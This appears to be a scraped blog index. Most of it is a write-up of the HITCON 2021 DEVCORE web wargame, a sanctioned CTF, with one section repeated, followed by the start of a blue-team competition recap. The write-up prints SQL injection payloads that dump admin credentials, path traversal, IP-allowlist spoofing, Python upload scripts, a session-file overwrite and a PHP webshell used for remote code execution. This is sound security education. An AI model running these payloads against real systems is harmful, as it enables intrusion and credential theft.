stuff, the reward sounded cool XD (Also the CTC’s CTF offered OSCP training for top 3, but that difficulty… QQ) Thanks to @stavhaygn and @splitline for being willing to give hints, and thanks to @arikoi for listening to my frustrations when I couldn’t crack it XDDD ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:1:0","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#chitchat"},{"categories":["Cyber Security"],"content":" DescriptionYou are a penetration testing expert who just received a commission to perform penetration testing on a website, with a deadline of 11/27. Due to schedule, budget pressures, and phased arrangements, the client wants to prioritize finding Server-Side related vulnerabilities. Your task is to find potentially risky Server-Side vulnerabilities within the timeline and submit a penetration test report! Notes Each vulnerability is based on real cases, so try to imagine how modern websites are deployed and what architecture they have as your starting point. Each flag submitted unlocks a vulnerability section in the report, with details and remediation suggestions, giving you a feel for what practical reports look like! As a professional Pentester, you must be trustworthy to clients, so no malicious destruction or deletion/overwriting of any files or database content you didn’t create. Violating rules, destroying the system, or maliciously interfering with other participants will disqualify you from all prizes. ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:2:0","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#description"},{"categories":["Cyber Security"],"content":" DescriptionYou are a penetration testing expert who just received a commission to perform penetration testing on a website, with a deadline of 11/27. Due to schedule, budget pressures, and phased arrangements, the client wants to prioritize finding Server-Side related vulnerabilities. Your task is to find potentially risky Server-Side vulnerabilities within the timeline and submit a penetration test report! Notes Each vulnerability is based on real cases, so try to imagine how modern websites are deployed and what architecture they have as your starting point. Each flag submitted unlocks a vulnerability section in the report, with details and remediation suggestions, giving you a feel for what practical reports look like! As a professional Pentester, you must be trustworthy to clients, so no malicious destruction or deletion/overwriting of any files or database content you didn’t create. Violating rules, destroying the system, or maliciously interfering with other participants will disqualify you from all prizes. ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:2:0","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#notes"},{"categories":["Cyber Security"],"content":" SolutionThe target website is a copier ordering site. After filling in information, you can view order info and receipt/print. There are six vulnerabilities total to get flags. The whole process took considerable time. I’ll try to skip unnecessary detours (definitely not because I forgot). The official penetration test report is at the bottom for reference. Opening move was @stavhaygn finding SQLi vulnerability in the PDF export page. Original URL: url http://web.ctf.devcore.tw/print.php?id=35640\u0026sig=4ufNcDscM0YTLDrd0gDyqDJCx8EPJh1kyq1ghUc6ZPztC0xmq96CPQ5vk8l2LBDi ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:0","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#solution"},{"categories":["Cyber Security"],"content":" Vulnerability 2: Broken Access ControlI originally thought the order number would be validated by that sig string so IDOR wouldn’t work, but while poking SQLi, @stavhaygn found the first order had a flag. url http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E\u0026id=3456055 union select id,name,email,phone,status,sig_hash,order_date,address,note FROM orders where id = 1 Submitting it revealed the official solution was Broken Access Control - didn’t even need SQLi. Really stumbled onto it XDDD ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:1","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#vulnerability-2-broken-access-control"},{"categories":["Cyber Security"],"content":" Vulnerability 3: SQL InjectionFor SQLi techniques, refer to NSYSU Hacker Attack \u0026 Defense HW 0x02 Writeups. Using Union Select SOP is similar so I won’t elaborate. Database structure: bash web |-- items |- id |- title |- description |-- rate_limit |- ip |- last_visit |- visit_times |-- orders |- id |- name |- email |- phone |- status |- sig_hash |- order_date |- address |- note |-- options |- key |- value |-- backend_users |- id |- username |- password |- description Oh and don’t casually use sqlmap --dump to brute force the database. The order data volume will waste tons of time Zzzzz url http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E\u0026id=3456055 union select 1,@@version,id,GROUP_CONCAT(username),5,6,GROUP_CONCAT(password),GROUP_CONCAT(description),9 FROM backend_users Got flag from backend_users admin, plus plaintext password (scary) Also didn’t expect same SQLi to yield two flags. Quite interesting XD ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:2","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#vulnerability-3-sql-injection"},{"categories":["Cyber Security"],"content":" Vulnerability 1: Path TraversalFound homepage images have id parameter. Base64 decoding reveals the image filename. Original URL: url http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc= Simple testing reveals LFI vulnerability here. But I spent a long time on this part - multiple base64 layers are annoying, and path guessing felt like psychic work== Here’s part of my terminal screenshot (showing off Hoshimachi). Turns out it wasn’t psychic at all - if you understand websites, websites will help you(?) Finally figured out root is at ../../../../, and officials even put hints in /etc/passwd, thanks XD Thanks to @stavhaygn’s psychic guess of frontend at ../frontend/, also found image.php source code. php \u003c?php require_once('include.php'); $id = $_GET['id']; $file = base64_urlsafe_decode($id); $file = IMAGE_PATH . $file; if (!file_exists($file)) { http_response_code(404); } else { header('Content-Type: ' . mime_content_type($file)); readfile($file); } Kept guessing paths where flags might be hidden, found some weird paths (like /usr/share/file/magic/). Until @stavhaygn asked “why so polite not grabbing other .php files?”…makes sense. Finally found flag in include.php. So this was the first level. ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:3","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#vulnerability-1-path-traversal"},{"categories":["Cyber Security"],"content":" Vulnerability 4: Use of Less Trusted SourceAt this point @stavhaygn seemed stuck too. So I went to social engineer first place splitline and got keyword /proc/mounts. This file records current system mount info. Honestly I’d never think to check this. Experienced pros are different. file ... /dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 ... Downloaded file shows some common system files in /dev/sda, plus @stavhaygn’s guessed /usr/share/nginx/frontend. But what caught my attention was /usr/share/nginx/b8ck3nd… this backend path clearly doesn’t want you to guess lol Direct hit on http://web.ctf.devcore.tw/b8ck3nd/index.php gets 302 redirect to homepage. So I continued using LFI to check backend source code. Finally found IP whitelist in ../../../../b8ck3nd/include.php, clearly meant to login from /b8ck3nd/login.php. php \u003c?php require_once('../frontend/include.php'); session_start_once(); if (!in_array(get_client_ip(), ['127.0.0.1', '172.18.11.89'], true)) { header('Location: /'); exit(); } if (!isset($_SESSION['user_id'])) { if (!endsWith($_SERVER['SCRIPT_FILENAME'], 'login.php')) { header('Location: /b8ck3nd/login.php'); exit(); } } Next step is spoofing IP to access backend. Most intuitive is Burp intercepting packets to modify headers, but after trying a while, though I could reach login page, results weren’t great - couldn’t find auto-add parameter method and had to keep copying/pasting, plus site kept loading after sending packets. Later switched to Google extension ModHeader. Really convenient! Backend credentials from Vuln 3’s SQLi backend_users. Successfully logged in to see flag directly. ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:4","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#vulnerability-4-use-of-less-trusted-source"},{"categories":["Cyber Security"],"content":" Vulnerability 5: Unrestricted File UploadWhile LFI-ing source code, found /b8ck3nd/upload.php. Original purpose was uploading images, but this is obviously for us to inject backdoors XD php \u003c?php require_once('include.php'); if ($_SERVER['REQUEST_METHOD'] == 'GET') { header('Content-Type: text/plain'); echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk'; exit(); } if (isset($_FILES['file']) \u0026\u0026 is_uploaded_file($_FILES['file']['tmp_name'])) { header('Content-Type: application/json; charset=utf-8'); $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filename = random_str(32).'.'.$ext; if (isset($_POST['rename'])) { $filename = $_POST['rename']; } if (isset($_POST['folder'])) { $folder = $_POST['folder']; if (!file_exists(IMAGE_PATH.$folder)) { mkdir(IMAGE_PATH.$folder); } $filename = $folder.'/'.$filename; } $filepath = IMAGE_PATH . $filename; move_uploaded_file($_FILES['file']['tmp_name'], $filepath); system(\"rsync_wrap \".escapeshellarg($filepath)); $id = base64_urlsafe_encode($filename); echo json_encode([ 'default' =\u003e '/image.php?id='.$id ]); } else { http_response_code(400); } From source code, using GET to upload gives a JWT string. I used python requests to upload. Since it checks include.php first, remember to include required IP and cookies parameters. I manually logged in as admin then copied cookies; there’s probably a better way. Also, lines 15-23 show system allows custom filenames and upload folders. I initially ignored these since I thought they weren’t needed. Until I couldn’t crack further, Arikoi asked “if you can upload folders, try uploading dot-dot-slash”… great idea! Turns out just saving files outside default path (/images/) makes flag appear (faster than expected==). Also this path can be verified through LFI. (Code at the time, for reference only) python import requests url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': '\u003cPHPSESSID\u003e'} files = {'file': open('test.php', 'rb')} data = {'folder': '../tmp', 'rename': 'test.php'} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:5","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#vulnerability-5-unrestricted-file-upload"},{"categories":["Cyber Security"],"content":" Vulnerability 6: Local File InclusionThat said, verifying uploaded files through LFI shows 404. Uploading to /frontend/ or /b8ck3nd/ also fails, meaning uploads blocked except /images/ (from /proc/mounts we saw frontend/backend directories are read-only). No wonder the previous flag besides appearing also asked Warning Now, can you get shell? Can’t reach backdoor, where else can we put files? This was my question then. Vuln 5’s report actually hints /tmp/pwn.php, confirmed uploadable (but not directly accessible). But how to do “RCE” was unfamiliar. My usual CTF only handles simple stuff, rarely touching complex WebSec. The whole RCE process was quite fuzzy. I referenced two articles on LFI to RCE: Triggering RCE via LFI through PHP session files Upgrade from LFI to RCE via PHP Sessions The key is after login, system enables session on server (default path /tmp/sess_{SESSIONID}). Using random cookies through LFI shows lang|s:5:\"zh-tw\";user_id|s:1:\"1\";. According to the second article, we can try exploiting lang. Looking back at /frontend/include.php, there are clues in session, including default require_once including langs/zh-tw.php. Downloaded it’s empty. My thinking got stuck here. @stavhaygn joked “officials are obviously guiding you, telling you something’s weird here”. php ... define('DEFAULT_LANGUAGE', 'zh-tw'); define('ALLOWED_LANGUAGE', 'zh-tw'); function session_start_once() { if (!isset($_SESSION)) { session_start(); } } session_start_once(); if (!isset($_SESSION['lang'])) { $_SESSION['lang'] = DEFAULT_LANGUAGE; } require_once('langs/' . $_SESSION['lang'] . '.php'); ... I hit a wall for about 2 hours because I didn’t understand RCE backdoor operations. Kept trying to stuff webshell into /tmp/sess_{SESSIONID} then actively execute through LFI. Turns out approach was close but execution wrong. Organized thoughts: each request executes require_once('include.php');, and language loads different PHP from langs/ based on session. If we can exploit this “load PHP” vulnerability to swap zh-tw.php for shell.php, we can execute code for RCE. But how? I’ll split this into uploading backdoor and using backdoor, both through upload.php. (1) Upload BackdoorCode is similar. Backdoor upload location at /tmp/cyris.php on server - just needs to be reachable. (Local test.php can have \u003c?php system(\"ls -al\"); ?\u003e or \u003c?php phpinfo(); ?\u003e to verify) python import requests cookie = '\u003cPHPSESSID\u003e' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('test.php', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'cyris.php'} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) P.S. Really wanted to leave my name cyris.php on DEVCORE’s machine (2) Use BackdoorWith backdoor, need to trigger it! We write our own session file to overwrite server’s /tmp/sess_{SESSIONID} to our shape w. Content like lang|s:27:\"../../../../../../tmp/cyris\";user_id|s:1:\"1\"; Note format must be correct and path must reach backdoor. python import requests cookie = '\u003cPHPSESSID\u003e' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('session', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'sess_'+cookie} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) If successful, direct LFI shows results. Then we can find flags through backdoor. Using \u003c?php system($_GET['cmd']); ?\u003e lets us GET commands directly, like: url http://web.ctf.devcore.tw/image.php?id=\u003cfilepath_base64\u003e\u0026cmd=../../../../readflag2 Looks concise but this took my whole evening. Especially session overwrites kept breaking. Lack of experience meant no debugging direction. Thanks @stavhaygn for patient guidance. Burned many brain cells QwQ Later used RCE to browse /tmp/ -","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:6","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#vulnerability-6-local-file-inclusion"},{"categories":["Cyber Security"],"content":" Vulnerability 6: Local File InclusionThat said, verifying uploaded files through LFI shows 404. Uploading to /frontend/ or /b8ck3nd/ also fails, meaning uploads blocked except /images/ (from /proc/mounts we saw frontend/backend directories are read-only). No wonder the previous flag besides appearing also asked Warning Now, can you get shell? Can’t reach backdoor, where else can we put files? This was my question then. Vuln 5’s report actually hints /tmp/pwn.php, confirmed uploadable (but not directly accessible). But how to do “RCE” was unfamiliar. My usual CTF only handles simple stuff, rarely touching complex WebSec. The whole RCE process was quite fuzzy. I referenced two articles on LFI to RCE: Triggering RCE via LFI through PHP session files Upgrade from LFI to RCE via PHP Sessions The key is after login, system enables session on server (default path /tmp/sess_{SESSIONID}). Using random cookies through LFI shows lang|s:5:\"zh-tw\";user_id|s:1:\"1\";. According to the second article, we can try exploiting lang. Looking back at /frontend/include.php, there are clues in session, including default require_once including langs/zh-tw.php. Downloaded it’s empty. My thinking got stuck here. @stavhaygn joked “officials are obviously guiding you, telling you something’s weird here”. php ... define('DEFAULT_LANGUAGE', 'zh-tw'); define('ALLOWED_LANGUAGE', 'zh-tw'); function session_start_once() { if (!isset($_SESSION)) { session_start(); } } session_start_once(); if (!isset($_SESSION['lang'])) { $_SESSION['lang'] = DEFAULT_LANGUAGE; } require_once('langs/' . $_SESSION['lang'] . '.php'); ... I hit a wall for about 2 hours because I didn’t understand RCE backdoor operations. Kept trying to stuff webshell into /tmp/sess_{SESSIONID} then actively execute through LFI. Turns out approach was close but execution wrong. Organized thoughts: each request executes require_once('include.php');, and language loads different PHP from langs/ based on session. If we can exploit this “load PHP” vulnerability to swap zh-tw.php for shell.php, we can execute code for RCE. But how? I’ll split this into uploading backdoor and using backdoor, both through upload.php. (1) Upload BackdoorCode is similar. Backdoor upload location at /tmp/cyris.php on server - just needs to be reachable. (Local test.php can have \u003c?php system(\"ls -al\"); ?\u003e or \u003c?php phpinfo(); ?\u003e to verify) python import requests cookie = '' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('test.php', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'cyris.php'} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) P.S. Really wanted to leave my name cyris.php on DEVCORE’s machine (2) Use BackdoorWith backdoor, need to trigger it! We write our own session file to overwrite server’s /tmp/sess_{SESSIONID} to our shape w. Content like lang|s:27:\"../../../../../../tmp/cyris\";user_id|s:1:\"1\"; Note format must be correct and path must reach backdoor. python import requests cookie = '' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('session', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'sess_'+cookie} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) If successful, direct LFI shows results. Then we can find flags through backdoor. Using \u003c?php system($_GET['cmd']); ?\u003e lets us GET commands directly, like: url http://web.ctf.devcore.tw/image.php?id=\u0026cmd=../../../../readflag2 Looks concise but this took my whole evening. Especially session overwrites kept breaking. Lack of experience meant no debugging direction. Thanks @stavhaygn for patient guidance. Burned many brain cells QwQ Later used RCE to browse /tmp/ -","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:6","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#1-upload-backdoor"},{"categories":["Cyber Security"],"content":" Vulnerability 6: Local File InclusionThat said, verifying uploaded files through LFI shows 404. Uploading to /frontend/ or /b8ck3nd/ also fails, meaning uploads blocked except /images/ (from /proc/mounts we saw frontend/backend directories are read-only). No wonder the previous flag besides appearing also asked Warning Now, can you get shell? Can’t reach backdoor, where else can we put files? This was my question then. Vuln 5’s report actually hints /tmp/pwn.php, confirmed uploadable (but not directly accessible). But how to do “RCE” was unfamiliar. My usual CTF only handles simple stuff, rarely touching complex WebSec. The whole RCE process was quite fuzzy. I referenced two articles on LFI to RCE: Triggering RCE via LFI through PHP session files Upgrade from LFI to RCE via PHP Sessions The key is after login, system enables session on server (default path /tmp/sess_{SESSIONID}). Using random cookies through LFI shows lang|s:5:\"zh-tw\";user_id|s:1:\"1\";. According to the second article, we can try exploiting lang. Looking back at /frontend/include.php, there are clues in session, including default require_once including langs/zh-tw.php. Downloaded it’s empty. My thinking got stuck here. @stavhaygn joked “officials are obviously guiding you, telling you something’s weird here”. php ... define('DEFAULT_LANGUAGE', 'zh-tw'); define('ALLOWED_LANGUAGE', 'zh-tw'); function session_start_once() { if (!isset($_SESSION)) { session_start(); } } session_start_once(); if (!isset($_SESSION['lang'])) { $_SESSION['lang'] = DEFAULT_LANGUAGE; } require_once('langs/' . $_SESSION['lang'] . '.php'); ... I hit a wall for about 2 hours because I didn’t understand RCE backdoor operations. Kept trying to stuff webshell into /tmp/sess_{SESSIONID} then actively execute through LFI. Turns out approach was close but execution wrong. Organized thoughts: each request executes require_once('include.php');, and language loads different PHP from langs/ based on session. If we can exploit this “load PHP” vulnerability to swap zh-tw.php for shell.php, we can execute code for RCE. But how? I’ll split this into uploading backdoor and using backdoor, both through upload.php. (1) Upload BackdoorCode is similar. Backdoor upload location at /tmp/cyris.php on server - just needs to be reachable. (Local test.php can have \u003c?php system(\"ls -al\"); ?\u003e or \u003c?php phpinfo(); ?\u003e to verify) python import requests cookie = '' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('test.php', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'cyris.php'} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) P.S. Really wanted to leave my name cyris.php on DEVCORE’s machine (2) Use BackdoorWith backdoor, need to trigger it! We write our own session file to overwrite server’s /tmp/sess_{SESSIONID} to our shape w. Content like lang|s:27:\"../../../../../../tmp/cyris\";user_id|s:1:\"1\"; Note format must be correct and path must reach backdoor. python import requests cookie = '' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('session', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'sess_'+cookie} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) If successful, direct LFI shows results. Then we can find flags through backdoor. Using \u003c?php system($_GET['cmd']); ?\u003e lets us GET commands directly, like: url http://web.ctf.devcore.tw/image.php?id=\u0026cmd=../../../../readflag2 Looks concise but this took my whole evening. Especially session overwrites kept breaking. Lack of experience meant no debugging direction. Thanks @stavhaygn for patient guidance. Burned many brain cells QwQ Later used RCE to browse /tmp/ -","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:3:6","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#2-use-backdoor"},{"categories":["Cyber Security"],"content":" AfterwordHave to say this idea of unlocking penetration report with flags is great. The whole process has clear logic to follow. Just lack of experience made me psychic-guess randomly and need to ask for help QQ. Chatting with DEVCORE at the venue, I learned the whole challenge set is continuous RCE techniques, picking up flags along the way. Love this feeling of learning skills. Though recreating the system environment myself seems hard - would be nice to put on self-hosted CTFd. Also realized LFI severity. In past CTFs I only thought the danger was sensitive data leakage. Didn’t expect combining with PHP Sessions enables RCE, directly reaching into the system is scary \u003e\"\u003c Finally, the official carefully crafted penetration test report XD ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:4:0","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#afterword"},{"categories":["Cyber Security"],"content":"HITCON 2021 Education Defense participation and blue team experience","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/"},{"categories":["Cyber Security"],"content":"Stop! Please stop shutting down our machines LAAAAAAAAAAAAAAAA TL;DR This post exists partly because we got beaten badly and needed a review, and also because there was almost no information available before the competition, so I thought I’d write some notes. If you’re hoping to learn our blue team strategy from this post, sorry, there isn’t one : ( The overall event schedule was quite tight - from receiving event news on 10/01, it was over in less than a month. HITCON Defense is now in its third year, but this was the first Education (student) track. I’m grateful to have participated during my remaining student years. I usually only do CTF practice and rarely get the chance to play the blue team role, so I had essentially zero defense experience - all my defense knowledge came from textbooks or lectures without practical application. ","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:0:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#"},{"categories":["Cyber Security"],"content":" Training WorkshopThe organizers held a pre-competition training workshop. Looking at the agenda felt like a series of product promotions, and indeed it was about learning to use security products. There weren’t many students attending - mostly financial industry security personnel and corporate executives. Seeing all those job titles during registration was intimidating (scared.jpg). Before registering, I naively thought defense only required writing some iptable rules. DAY 1 mainly covered Palo Alto Network 3220 firewall (abbreviated as PA) and Cortex XDR products. Honestly, I hadn’t heard of them before - only learned post-competition that they’re common in the industry, or in Taiwan maybe… ZYXEL? The whole day was lab-based. While I could follow the guide, mastering it quickly was truly difficult. Being used to CLI tools and suddenly having to use feature-packed products left me somewhat overwhelmed XDDD DAY 2 afternoon covered Citrix WAF. Originally seeing OWASP on the agenda, I thought it would be the usual stuff, but the course was surprisingly solid. The instructor started from red team attack perspectives, shared interesting industry anecdotes, and even asked us (students) to look at the blue team victims from other companies and think carefully about whether to enter the security industry. The instructor also mentioned that previous years’ blue teams were devastated, eventually competing on “who was less devastated.” Though back then teams could exchange intelligence and help each other - this year, due to COVID, each team had to stay in small rooms without interaction, possibly making it worse QQ What surprised me was that this training, despite the HITCON branding, had no familiar faces. Unsurprisingly, on competition day, all the experts were on the opposing red team / Infra. Also, the Education track didn’t have a “procurement department” for buying additional security products with points, so of the three products introduced in training, only PA was available. But with less than three hours of hands-on time, I couldn’t even find the option to save traffic as PCAP files XDDDD ","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:1:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#training-workshop"},{"categories":["Cyber Security"],"content":" Night Before Competition Cyris - Some clueless blue team victim from the south We blue team members don’t even understand the services we’re supposed to protect - asking the neighboring red team might be more informative (/ =ω=)/ Conclusion: Rather than cramming overnight, better to just sleep early Thinking about it, blue team competition really is a “team game” - unlike regular CTF where everyone works independently on different challenges. With no information beforehand, we decided to hold a meeting to discuss tactics. We created a shared doc listing system information to collect early, plus basics like changing passwords, checking external ports, scheduled tasks, and updating services. With web servers, we needed to consider defenses against IDOR, XSS, and worried about recent Apache CVEs. AD was an expected focus, so we discussed checking DC settings, how to use GPO, whether to disable SMB… yes, there was a service checker, so we couldn’t just shut down services at will. We discussed possible check methods - like if we banned red team IPs, all services might fail checks, which would be troublesome XD Looking back, our thinking was actually on the right track, but we couldn’t find things / didn’t know how to use tools / couldn’t interpret results / made wrong judgments. In the chaos on-site, we couldn’t get into the groove, which was a shame. ","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:2:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#night-before-competition"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or 